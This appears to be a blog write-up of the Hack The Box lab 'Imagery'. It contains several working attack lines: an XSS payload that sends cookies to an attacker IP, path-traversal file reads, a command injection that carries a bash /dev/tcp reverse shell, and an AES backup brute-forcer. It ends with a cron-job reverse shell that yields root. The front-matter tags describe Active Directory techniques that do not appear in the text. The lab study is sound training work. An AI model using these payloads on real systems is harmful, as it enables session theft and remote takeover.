---
title: "HTB Imagery"
date: 2026-01-04 11:00:00 +1100
categories: [Hack The Box]
tags: [
  Active Directory,
  Kerberos,
  SMB,
  BloodHound,
  Unconstrained Delegation,
  MSSQL,
  Linked Servers,
  NTDS.dit,
  secretsdump,
]

---

# HTB Imagery Writeup

This is my walkthrough for **Imagery**, starting from initial recon and moving through web exploitation to privilege escalation.

---

## Recon

Nmap

```php
 ┌──(kali㉿kali)-[~]
└─$ nmap --open 10.129.243.102 -sC -sV -T4 -p 22,8000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 10:17 AEST
Nmap scan report for 10.129.243.102
Host is up (0.41s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.99 seconds
                                                                                                 
┌──(kali㉿kali)-[~]

```

```php
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.242/FUZZ
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://10.129.243.102/FUZZ
```

---

## XSS to Admin

Report Bug Feature

![image.png](/assets/img/imagery/1.png)

```php
POST /report_bug HTTP/1.1
Host: 10.129.243.102:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.243.102:8000/
Content-Type: application/json
Content-Length: 248
Origin: http://10.129.243.102:8000
Connection: keep-alive
Cookie: session=.eJyrVkrJLC7ISaz0TFGyUjIxNEtNszA0VdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCLzk_V6kWAHHRLmA.aNh_JA.N2Eck-poPjB0aH0xw-r_GshVZOE
Priority: u=0

{"bugName":"<script>   new Image().src = \"http://10.10.14.2/steal?c=\" + encodeURIComponent(document.cookie); </script>","bugDetails":"<script>\n  new Image().src = \"http://10.10.14.2/steal?c=\" + encodeURIComponent(document.cookie);\n</script>"}
```

```php
─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.243.102 - - [28/Sep/2025 10:36:35] "GET /?session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNiDMw.9hEH4V0pyfbbnvCRF5u-bjNyU98 HTTP/1.1" 200 -

```

made it to the admin panel

![image.png](/assets/img/imagery/2.png)

---

## LFI Exploration

LFI

![image.png](/assets/img/imagery/3.png)

![image.png](/assets/img/imagery/4.png)

Let's try a test for LFI

![image.png](/assets/img/imagery/5.png)

We can check the cmdline

![image.png](/assets/img/imagery/6.png)

and the config

```php
GET /admin/get_system_log?log_identifier=../../../../../home/web./web/config.py HTTP/1.1
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Sun, 28 Sep 2025 01:05:03 GMT
Content-Disposition: attachment; filename=config.py
Content-Type: text/plain; charset=utf-8
Content-Length: 1809
Last-Modified: Tue, 05 Aug 2025 08:59:49 GMT
Cache-Control: no-cache
ETag: "1754384389.0-1809-2611745984"
Date: Sun, 28 Sep 2025 01:05:03 GMT
Vary: Cookie
Connection: close

import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0.16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'

```

app.py

```php
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Sun, 28 Sep 2025 01:20:53 GMT
Content-Disposition: attachment; filename=app.py
Content-Type: text/plain; charset=utf-8
Content-Length: 1943
Last-Modified: Tue, 05 Aug 2025 15:21:25 GMT
Cache-Control: no-cache
ETag: "1754407285.0-1943-1581716363"
Date: Sun, 28 Sep 2025 01:20:53 GMT
Vary: Cookie
Connection: close

from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)

```

We can see that there is a .json database. So we can check out the JSON database.

![image.png](/assets/img/imagery/7.png)

Let's try to crack both hashes

![image.png](/assets/img/imagery/8.png)

But we can't ssh in

```php
└─$ ssh mark@10.129.243.102                
The authenticity of host '10.129.243.102 (10.129.243.102)' can't be established.
ED25519 key fingerprint is SHA256:1f09NrF6QWI5nbZzSJJflV8ACTiH/pMDmhIFayf3VD4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.243.102' (ED25519) to the list of known hosts.
mark@10.129.243.102: Permission denied (publickey).
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ ssh web@10.129.243.102
web@10.129.243.102: Permission denied (publickey).
                                                                                                 

```

---

## Source Review + Injection Point

If we take a look at the source code

```php
GET /admin/get_system_log?log_identifier=../../../../../home/web/web/api_edit.py HTTP/1.1
Host: 10.129.243.102:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNiD5w.r1uDUfODeL4eqR-neujY028NbXg
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

```php
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Sun, 28 Sep 2025 02:08:51 GMT
Content-Disposition: attachment; filename=api_edit.py
Content-Type: text/plain; charset=utf-8
Content-Length: 11876
Last-Modified: Tue, 05 Aug 2025 08:57:07 GMT
Cache-Control: no-cache
ETag: "1754384227.0-11876-3325826441"
Date: Sun, 28 Sep 2025 02:08:51 GMT
Vary: Cookie
Connection: close

from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
if not session.get('is_testuser_account'):
 if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
    
```

I've just strung together the important parts of the code. We can see that we need to be the test user to use this function

We can see that the input x and y, as well as the width and height, are being used without being sanitised in the command for the ImageMagick binary.

So if we fill this out

![image.png](/assets/img/imagery/9.png)

then open it up in Burp Suite t

We can change the request to inject code

```php
POST /apply_visual_transform HTTP/1.1
Host: 10.129.243.102:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.243.102:8000/
Content-Type: application/json
Content-Length: 175
Origin: http://10.129.243.102:8000
Connection: keep-alive
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aNiOTQ.q1MfkDklqg-9pP5BxUADoM_LHiU
Priority: u=0

{"imageId":"c7287322-ef03-407d-a6e1-98f73ac013f9","transformType":"crop","params":{"x":1,"y":1,"width":259,"height":"2$(bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1')"
}}
```

```php
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                                    
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.243.102] 60254
bash: cannot set terminal process group (1431): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$ 

```

---

## Backups + Password Recovery

from the linpeas output, there is a var backup

```php
                                                                                                 
╔══════════╣ Backup folders
drwx------ 2 root root 4096 Sep 22 19:10 /etc/lvm/backup                                         
drwxr-xr-x 2 root root 3 Apr 18  2022 /snap/core22/2045/var/backups
total 0

drwxr-xr-x 2 root root 3 Apr 18  2022 /snap/core22/2133/var/backups
total 0

drwxr-xr-x 3 root root 4096 Oct  7  2024 /usr/lib/python3/dist-packages/botocore/data/backup
total 4
drwxr-xr-x 2 root root 4096 Oct  7  2024 2018-11-15

drwxr-xr-x 2 root root 4096 Sep 22 18:56 /var/backup
total 22516
-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes

drwxr-xr-x 3 root root 4096 Sep 23 16:31 /var/backups
```

if we transfer the file to our host, we can try brute forcing the password by writing the following code

```php
└─$ cat crack.py
import pyAesCrypt
import os

# Setup
input_file = "web_20250806_120723.zip.aes"
output_file = "test.zip"  # assume it's a zip inside
wordlist = "/usr/share/wordlists/rockyou.txt"

# AES buffer size used during encryption (same as pyAesCrypt default)
buffer_size = 64 * 1024

with open(wordlist, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        try:
            # Try decrypting
            pyAesCrypt.decryptFile(input_file, output_file, password, buffer_size)
            
            # If no exception, password is correct
            print(f"[+] Success! Password found: {password}")
            
            # Optional: check if valid zip
            os.system(f"file {output_file}")
            break
        except Exception:
            # Wrong password, try next
            continue

print("[-] Done.")

```

Now we run it

```php
┌──(kali㉿kali)-[~/boxes/imagrey]
└─$ python3 crack.py  
[+] Success! Password found: bestfriends
test.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
[-] Done.
                                                                                                 
┌──(kali㉿kali)-[~/boxes/imagrey]
└─$ 

```

from here, we can unzip it and cat the db.json fil,e and we see the user mark

```php
 {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {

```

We can crack his password

![image.png](/assets/img/imagery/10.png)

---

## PrivEsc

As we can see we have sudo priv for Mark

```php
mark@Imagery:/tmp$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
mark@Imagery:/tmp$ 

```

We can reset the password to the default

```php
mark@Imagery:/tmp$ sudo /usr/local/bin/charcol help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
mark@Imagery:/tmp$ sudo /usr/local/bin/charcol --reset-password-to-default

Attempting to reset Charcol application password to default.
[2025-09-28 05:29:49] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-09-28 05:29:56] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
mark@Imagery:/tmp$ sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): 
Aborted 'no password' mode setup. Please choose again.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): yes
[2025-09-28 05:30:24] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
mark@Imagery:/tmp$ sudo /usr/local/bin/charcol shell

```

and then add a cron job

```php
auto add  --schedule "* * * * *"   --command "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'"  --name "rev"
─(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.243.102] 56420
bash: cannot set terminal process group (163656): Inappropriate ioctl for device
bash: no job control in this shell
root@Imagery:~# cat /root/root.txt
cat /root/root.txt
348b23f9b60df97cc483d30de7bd74f6
root@Imagery:~# 

```

---

